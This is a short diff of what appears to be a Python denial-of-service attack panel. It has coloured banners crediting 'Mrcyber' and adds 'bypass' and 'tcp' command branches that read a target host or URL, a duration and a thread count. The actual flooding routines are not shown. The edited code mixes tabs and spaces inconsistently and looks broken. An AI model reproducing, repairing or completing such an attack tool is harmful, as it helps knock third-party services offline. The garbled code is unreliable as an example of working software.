@@ -666,8 +666,11 @@ def main():
 \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
 \033[35m           ╚════════════════════════════════════════════════════════╝
 """)
-		
-		eelif "bypass" in cnc
+                       except ValueError:
+				main()
+			except IndexError:
+				main()
+		elif sinput == "bypass" or sinput == "BYPASS":
 			try:
 				host = sin.split()[1]
 				time = sin.split()[2]
@@ -696,8 +699,11 @@ def main():
 \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
 \033[35m           ╚════════════════════════════════════════════════════════╝
 """)
-		
-                elif "MIX" in cnc
+                        except ValueError:
+				main()
+			except IndexError:
+				main()
+		elif sinput == "tcp" or sinput == "TCP":
 			try:
 				url = sin.split()[1]
 				thread = sin.split()[2]
